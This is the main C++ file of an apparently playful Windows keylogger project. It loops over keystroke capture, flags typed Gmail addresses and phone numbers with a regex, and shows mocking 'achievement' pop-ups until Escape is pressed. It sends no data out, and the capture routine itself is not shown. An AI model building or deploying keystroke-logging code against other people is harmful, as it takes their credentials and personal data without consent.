/*
Written in August of 2026 by Noga Levy.

Using the functions in functions.h, main.cpp is the sum of all the other programs--it uses keylogger.cpp to log the keys, and 
send_notification.cpp to handle notifications.
*/


#include <iostream>
#include <vector>
#include <string>
#include <windows.h>
#include <unordered_map>
#include "functions.h"

// Variable set up
std::string keylog = " ";
std::unordered_map<int, int> key_press_map;

bool gmail_triggered = false;
bool phone_num_triggered = false;


std::unordered_map<std::string, std::string> achievements = {{"@gmail.com", "Business Man"}, {"phone", "Cold Caller"}};
std::unordered_map<std::string, std::string> description = {
    {"@gmail.com", "Had I been malicious, I probably would have sold the gmail you just typed in a massive dataset. But since I'm not, all the best from your local keylogger!"},
    {"phone", "Heyo, I just found a phone number! Beware of what you share--I hope that's not your boss, because I'm tempted give them a call..."}
};

int main(){
    // Initizializing unordered map
    for (int key = 0x08; key <= 0xFF; key++){
        key_press_map[key] = false;
    }
    
    // Key-logging loop
    while (true){
        keylogger(keylog, key_press_map);

        if (GetAsyncKeyState(VK_ESCAPE) & 0x8000){
            std::cout << "Ending Program" << std::endl;
            return 0;
        }

        
        send_notification("@gmail.com", gmail_triggered, keylog, ("Achievement: " + achievements["@gmail.com"] + ".\n" + description["@gmail.com"]));
        send_notification(R"(\(?[0-9]{3}\)?[ -][0-9]{3}[ -][0-9]{4})", phone_num_triggered, keylog, ("Achievement: " + achievements["phone"] + ".\n" + description["phone"]), true);
    }

    return 0;
}
